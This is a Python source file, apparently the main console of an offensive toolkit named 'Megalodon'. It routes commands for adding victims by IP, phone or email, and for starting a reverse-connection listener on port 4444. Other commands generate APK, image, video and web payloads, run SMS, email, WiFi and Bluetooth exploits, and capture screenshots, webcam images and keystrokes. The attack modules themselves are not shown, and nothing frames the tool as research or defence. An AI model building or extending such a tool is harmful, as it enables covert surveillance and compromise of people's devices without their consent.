#!/usr/bin/env python3

import sys
import os
import json
import threading
import socket
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))

from core.framework import Megalodon
from core.logger import logger

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '192.168.1.1'

def show_banner():
    banner = """
╔═══════════════════════════════════════════╗
║                                           ║
║     MEGALODON v1.0                        ║
║     Built from Scratch                    ║
║                                           ║
╚═══════════════════════════════════════════╝
"""
    print(banner)

def show_commands():
    print("""
📋 COMMANDS:

  TARGET:
    target add <ip|phone|email> <os> [name]  - Add target
    target list                              - List all targets
    target show <name>                       - Show target details
    target delete <name>                     - Delete a target
    target set <ip|phone|email> [os]         - Set current target

  LISTENER:
    listen start                             - Start listener for connections
    listen stop                              - Stop listener
    listen status                            - Show listener status

  RECON:
    scan                                     - Scan network for devices
    recon phone <number>                     - Scan phone number info
    recon email <address>                    - Scan email address info
    recon username <name>                    - Scan username across platforms
    recon social                             - Auto-scan current target

  PAYLOAD:
    payload apk                              - Generate Android APK
    payload image                            - Generate image payload
    payload video                            - Generate video payload
    payload web                              - Generate web payload

  EXPLOIT:
    exploit ip                               - IP/Network exploit (port scan)
    exploit sms                              - Send SMS exploit
    exploit email                            - Send email exploit
    exploit social                           - Social media recon on target
    exploit wifi                             - Run WiFi exploit
    exploit bluetooth                        - Run Bluetooth exploit

  POST-EXPLOIT:
    screenshot                               - Take screenshot
    webcam                                   - Capture webcam
    keylog start                             - Start keylogger
    keylog stop                              - Stop keylogger
    keylog logs                              - View keylogs

  SYSTEM:
    status                                   - Show current status
    session list                             - List active sessions
    help                                     - Show this help
    exit/quit                                - Exit

💡 Examples:
  target add 192.168.1.100 android Phone1
  scan
  recon email victim@gmail.com
  exploit social
  payload apk
  listen start
  exploit sms
  status
""")

def main():
    show_banner()
    megalodon = Megalodon()
    listener = None
    local_ip = get_local_ip()
    
    print(f"[+] Megalodon loaded! Local IP: {local_ip}")
    print("[+] Type 'help' to see commands")
    
    while True:
        try:
            cmd_input = input("\n> ").strip()
            if not cmd_input:
                continue
            
            parts = cmd_input.split()
            cmd = parts[0].lower()
            
            if cmd in ['exit', 'quit', 'q']:
                print("[+] Goodbye!")
                break
            
            elif cmd == 'help':
                show_commands()
            
            elif cmd == 'target':
                if len(parts) < 2:
                    print("[-] Usage: target <add|list|show|delete|set>")
                    continue
                
                if parts[1] == 'add' and len(parts) >= 3:
                    from core.target_manager import TargetManager
                    tm = TargetManager()
                    value = parts[2]
                    os_type = parts[3] if len(parts) > 3 else 'unknown'
                    name = parts[4] if len(parts) > 4 else value
                    tm.add_target(value, os_type, name)
                
                elif parts[1] == 'list':
                    from core.target_manager import TargetManager
                    tm = TargetManager()
                    tm.list_targets()
                
                elif parts[1] == 'show' and len(parts) >= 3:
                    from core.target_manager import TargetManager
                    tm = TargetManager()
                    target = tm.get_target(parts[2])
                    if target:
                        print("\n📋 TARGET DETAILS:")
                        print("=" * 40)
                        for key, value in target.items():
                            print(f"{key.capitalize()}: {value}")
                        print("=" * 40)
                    else:
                        print(f"[-] Target {parts[2]} not found")
                
                elif parts[1] == 'delete' and len(parts) >= 3:
                    from core.target_manager import TargetManager
                    tm = TargetManager()
                    confirm = input(f"Delete target {parts[2]}? (y/n): ")
                    if confirm.lower() == 'y':
                        tm.delete_target(parts[2])
                
                elif parts[1] == 'set' and len(parts) >= 3:
                    value = parts[2]
                    os_type = parts[3] if len(parts) > 3 else 'unknown'
                    
                    # Determine target type
                    is_ip = True
                    ip_parts = value.split('.')
                    if len(ip_parts) != 4:
                        is_ip = False
                    else:
                        for part in ip_parts:
                            if not part.isdigit() or not (0 <= int(part) <= 255):
                                is_ip = False
                                break
                    
                    is_phone = False
                    if not is_ip:
                        phone_clean = value.replace('+', '').replace('-', '').replace(' ', '').replace('(', '').replace(')', '')
                        if phone_clean.isdigit() and len(phone_clean) >= 7:
                            is_phone = True
                    
                    is_email = '@' in value and '.' in value
                    
                    target_type = 'ip' if is_ip else ('phone' if is_phone else ('email' if is_email else 'unknown'))
                    
                    target_info = {
                        'value': value,
                        'type': target_type,
                        'os': os_type
                    }
                    megalodon.set_target(target_info)
                    print(f"[+] Current target set to: {value} ({target_type})")
                
                else:
                    print("[-] Usage: target <add|list|show|delete|set>")
            
            elif cmd == 'listen':
                if len(parts) < 2:
                    print("[-] Usage: listen <start|stop|status>")
                    continue
                
                if parts[1] == 'start':
                    from core.listener import Listener
                    if listener is None:
                        listener = Listener(ip='0.0.0.0', port=4444)
                        listener_thread = threading.Thread(target=listener.start, daemon=True)
                        listener_thread.start()
                        print("[+] Listener started on 0.0.0.0:4444")
                        print("[+] Waiting for connections...")
                    else:
                        print("[+] Listener already running")
                
                elif parts[1] == 'stop':
                    if listener:
                        listener.stop()
                        listener = None
                        print("[+] Listener stopped")
                    else:
                        print("[-] Listener not running")
                
                elif parts[1] == 'status':
                    if listener:
                        sessions = listener.list_sessions()
                        print(f"[+] Listener running with {len(sessions)} active sessions")
                        for s in sessions:
                            print(f"  {s['session']['id']} | {s['address'][0]}:{s['address'][1]}")
                    else:
                        print("[-] Listener not running")
            
            elif cmd == 'scan':
                from modules.recon.network_scanner import scan
                result = scan()
                print(json.dumps(result, indent=2))
            
            elif cmd == 'recon':
                if len(parts) < 3:
                    print("[-] Usage: recon <phone|email|username|social> [value]")
                    continue
                
                recon_type = parts[1].lower()
                
                if recon_type == 'social':
                    from modules.recon.social_scanner import run
                    result = run(megalodon.target)
                    print(json.dumps(result, indent=2))
                
                elif recon_type == 'phone':
                    from modules.recon.phone_scanner import scan
                    result = scan(parts[2] if len(parts) > 2 else None)
                    print(json.dumps(result, indent=2))
                
                elif recon_type == 'email':
                    from modules.recon.email_scanner import scan
                    result = scan(parts[2] if len(parts) > 2 else None)
                    print(json.dumps(result, indent=2))
                
                elif recon_type == 'username':
                    from modules.recon.username_scanner import scan
                    result = scan(parts[2] if len(parts) > 2 else None)
                    print(json.dumps(result, indent=2))
                
                else:
                    print("[-] Unknown recon type. Use: phone, email, username, social")
            
            elif cmd == 'payload':
                if len(parts) < 2:
                    print("[-] Usage: payload <apk|image|video|web>")
                    continue
                
                if parts[1] == 'apk':
                    from modules.payloads.apk_generator import generate
                    result = generate()
                    print(json.dumps(result, indent=2))
                elif parts[1] == 'image':
                    from modules.payloads.image_payload import generate
                    result = generate()
                    print(json.dumps(result, indent=2))
                elif parts[1] == 'video':
                    from modules.payloads.video_payload import generate
                    result = generate()
                    print(json.dumps(result, indent=2))
                elif parts[1] == 'web':
                    from modules.payloads.web_payload import generate
                    result = generate()
                    print(json.dumps(result, indent=2))
                else:
                    print("[-] Unknown payload command")
            
            elif cmd == 'exploit':
                if len(parts) < 2:
                    print("[-] Usage: exploit <ip|sms|email|social|wifi|bluetooth>")
                    continue
                
                method = parts[1]
                
                if method == 'ip':
                    from modules.exploits.ip_exploit import run
                    result = run(megalodon.target)
                    print(json.dumps(result, indent=2))
                elif method == 'sms':
                    from modules.exploits.sms_exploit import run
                    result = run(megalodon.target)
                    print(json.dumps(result, indent=2))
                elif method == 'email':
                    from modules.exploits.email_exploit import run
                    result = run(megalodon.target)
                    print(json.dumps(result, indent=2))
                elif method == 'social':
                    from modules.recon.social_scanner import run
                    result = run(megalodon.target)
                    print(json.dumps(result, indent=2))
                elif method == 'wifi':
                    from modules.exploits.wifi_exploit import run
                    result = run()
                    print(json.dumps(result, indent=2))
                elif method == 'bluetooth':
                    from modules.exploits.bluetooth_exploit import run
                    result = run()
                    print(json.dumps(result, indent=2))
                else:
                    print(f"[-] Unknown exploit: {method}")
                    print("    Available: ip, sms, email, social, wifi, bluetooth")
            
            elif cmd == 'screenshot':
                from modules.post_exploit.screenshot_capture import run
                result = run(megalodon.target)
                print(json.dumps(result, indent=2))
            
            elif cmd == 'webcam':
                from modules.post_exploit.webcam_capture import run
                result = run(megalodon.target)
                print(json.dumps(result, indent=2))
            
            elif cmd == 'keylog':
                if len(parts) < 2:
                    print("[-] Usage: keylog <start|stop|logs>")
                    continue
                if parts[1] == 'start':
                    from modules.post_exploit.keylogger import start
                    result = start(megalodon.target)
                    print(json.dumps(result, indent=2))
                elif parts[1] == 'stop':
                    from modules.post_exploit.keylogger import stop
                    result = stop()
                    print(json.dumps(result, indent=2))
                elif parts[1] == 'logs':
                    from modules.post_exploit.keylogger import get_logs
                    result = get_logs()
                    print(json.dumps(result, indent=2))
            
            elif cmd == 'status':
                status = megalodon.get_status()
                print("\n📊 STATUS:")
                print("=" * 40)
                print(f"Target: {status.get('target', 'None')}")
                print(f"Compromised: {status.get('compromised', False)}")
                sessions = status.get('sessions', [])
                print(f"Sessions: {len(sessions)}")
                if sessions:
                    for s in sessions:
                        print(f"  - {s}")
                print("=" * 40)
            
            elif cmd == 'session':
                if len(parts) < 2 or parts[1] != 'list':
                    print("[-] Usage: session list")
                    continue
                sessions = megalodon.session.list_sessions()
                if sessions:
                    print("\n🔌 ACTIVE SESSIONS:")
                    print("=" * 40)
                    for s in sessions:
                        print(f"  ID: {s.get('id')} | Target: {s.get('target')}")
                    print("=" * 40)
                else:
                    print("[-] No active sessions")
            
            else:
                print(f"[-] Unknown command: {cmd}")
                print("    Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print("\n[+] Interrupted. Exiting...")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            logger.error(f"Error: {e}")

if __name__ == "__main__":
    main()
